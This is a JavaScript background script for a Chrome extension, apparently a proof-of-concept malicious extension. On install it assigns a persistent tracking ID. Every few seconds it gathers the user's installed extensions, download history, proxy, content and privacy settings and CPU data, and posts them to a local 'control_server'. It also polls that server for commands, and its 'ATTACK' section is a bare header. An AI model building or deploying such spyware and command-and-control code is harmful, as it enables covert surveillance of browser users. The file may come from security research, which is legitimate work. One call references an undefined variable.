//START, UID CREATION, PHASE STATE
chrome.runtime.onInstalled.addListener(function setuid(){
    const First_installed = Date.now().toString();
    console.log(First_installed)
    //https://stackoverflow.com/questions/521295/seeding-the-random-number-generator-in-javascript
    function cyrb128(str) {
        let h1 = 1779033703, h2 = 3144134277,
            h3 = 1013904242, h4 = 2773480762;
        for (let i = 0, k; i < str.length; i++) {
            k = str.charCodeAt(i);
            h1 = h2 ^ Math.imul(h1 ^ k, 597399067);
            h2 = h3 ^ Math.imul(h2 ^ k, 2869860233);
            h3 = h4 ^ Math.imul(h3 ^ k, 951274213);
            h4 = h1 ^ Math.imul(h4 ^ k, 2716044179);
        }
        h1 = Math.imul(h3 ^ (h1 >>> 18), 597399067);
        h2 = Math.imul(h4 ^ (h2 >>> 22), 2869860233);
        h3 = Math.imul(h1 ^ (h3 >>> 17), 951274213);
        h4 = Math.imul(h2 ^ (h4 >>> 19), 2716044179);
        return [((h1^h2^h3^h4)>>>0).toString() + ((h2^h1)>>>0).toString()+((h3^h1)>>>0).toString()+ ((h4^h1)>>>0).toString()];
    }
    const value = cyrb128(First_installed);
    var a = false;
    chrome.storage.local.get(["uid"]).then( (result)=>{result
        
        
        if (result.uid == undefined ){
            chrome.storage.local.set({uid:value});

        }
    
    });
    chrome.storage.local.set({phase:0});


})


//INFO (POC_Detective and Extension combined)

function logCPU(C){
    fetch('http://127.0.0.1:5000/control_server',
            {
            method: "POST",
            mode: 'no-cors', 
            body: JSON.stringify( C),
            headers:{"Content-Type": "application/json"}
            }
    )
    }
function logExApp(C){

    fetch('http://127.0.0.1:5000/control_server',
    {
    method: "POST",
    mode: 'no-cors', 
    body: JSON.stringify( C),
    headers:{"Content-Type": "application/json"}
    }
)   
}

function loggingcontentSettings(){

    var S='';

    chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){S+='Cookies : '+details.setting+'<br>';});
    chrome.contentSettings.images.get({primaryUrl:'http://*'},function(details){S+='Images : '+details.setting+'<br>';});
    chrome.contentSettings.javascript.get({primaryUrl:'http://*'},function(details){S+='JavaScript : '+details.setting+'<br>';});
    chrome.contentSettings.location.get({primaryUrl:'http://*'},function(details){S+='Location : '+details.setting+'<br>';});
    chrome.contentSettings.plugins.get({primaryUrl:'http://*'},function(details){S+='Plugins : '+details.setting+'<br>';});
    chrome.contentSettings.popups.get({primaryUrl:'http://*'},function(details){S+='Popups : '+details.setting+'<br>';});
    chrome.contentSettings.notifications.get({primaryUrl:'http://*'},function(details){S+='Notifications : '+details.setting+'<br>';});
    chrome.contentSettings.fullscreen.get({primaryUrl:'http://*'},function(details){S+='Full Screen : '+details.setting+'<br>';});
    chrome.contentSettings.mouselock.get({primaryUrl:'http://*'},function(details){S+='Mouse Lock : '+details.setting+'<br>';});
    chrome.contentSettings.microphone.get({primaryUrl:'http://*'},function(details){S+='Microphone : '+details.setting+'<br>';});
    chrome.contentSettings.camera.get({primaryUrl:'http://*'},function(details){S+='Camera : '+details.setting+'<br>';});
    chrome.contentSettings.unsandboxedPlugins.get({primaryUrl:'http://*'},function(details){S+='Unsandboxed Plugins : '+details.setting+'<br>';});
    chrome.contentSettings.automaticDownloads.get({primaryUrl:'http://*'},function(details){S+='Automatic Downloads : '+details.setting+'<br>';});
   
    setTimeout(function(){   fetch('http://127.0.0.1:5000/control_server',
    {
    method: "POST",
    mode: 'no-cors', 
    body: JSON.stringify(S),
    headers:{"Content-Type": "application/json"}
    });},1500);    


}

function loggingprivacySettings(){

    var S='';

    chrome.privacy.services.alternateErrorPagesEnabled.get({},function(details){S+='alternateErrorPagesEnabled : '+details.value + " " + details.levelOfControl  +' ';});
    chrome.privacy.services.safeBrowsingEnabled.get({},function(details){S+='safeBrowsingEnabled : '+details.value +  " " + details.levelOfControl +' ';});
    
    
    chrome.privacy.websites.hyperlinkAuditingEnabled.get({},function(details){S+='hyperlinkAuditingEnabled : '+details.value + " " + details.levelOfControl +' ';});
    chrome.privacy.websites.doNotTrackEnabled.get({},function(details){S+='doNotTrackEnabled : '+details.value + " " + details.levelOfControl +' ';});
    chrome.privacy.websites.protectedContentEnabled.get({},function(details){S+='protectedContentEnabled : '+details.value + " " + details.levelOfControl +' ';});
    
    setTimeout(function(){   fetch('http://127.0.0.1:5000/control_server',
    {
    method: "POST",
    mode: 'no-cors', 
    body: JSON.stringify(S),
    headers:{"Content-Type": "application/json"}
    });},1500);    


}


//chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){console.log(details)});
//https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings

chrome.alarms.create("info",{ periodInMinutes: 0.07 });

chrome.alarms.onAlarm.addListener((Alarm)=>{
    if (Alarm.name == "info"){
        chrome.system.cpu.getInfo((info)=>{logCPU(info)})
        chrome.management.getAll((info)=>{logExApp(info)})
        chrome.downloads.search({}).then(logExApp) 
        chrome.proxy.settings.get({'incognito': false}, logExApp(config))
        
        loggingcontentSettings()
        loggingprivacySettings();
        chrome.storage.local.get(["uid"]).then((result)=>{
    
            fetch('http://127.0.0.1:5000/control_server',
            {
            method: "POST",
            mode: 'no-cors',
            body: JSON.stringify(result.uid.toString()),
            headers:{"Content-Type": "application/json"}
            })
            
            });

    }
    })





//WAIT (GET request)





chrome.alarms.create("phase",{ periodInMinutes: 2 });
//https://stackoverflow.com/questions/60727329/chrome-extension-rejection-use-of-permissions-all-urls

chrome.alarms.onAlarm.addListener((Alarm) => {

    if (Alarm.name == "phase"){
        fetch('http://127.0.0.1:5000/request',
            {
            method: "GET",
            mode: 'no-cors', 
            headers:{"Content-Type": "application/json"}
            }).then(r => r.text()).then(result => {console.log(result)})
    }

})

//ATTACK (Download API)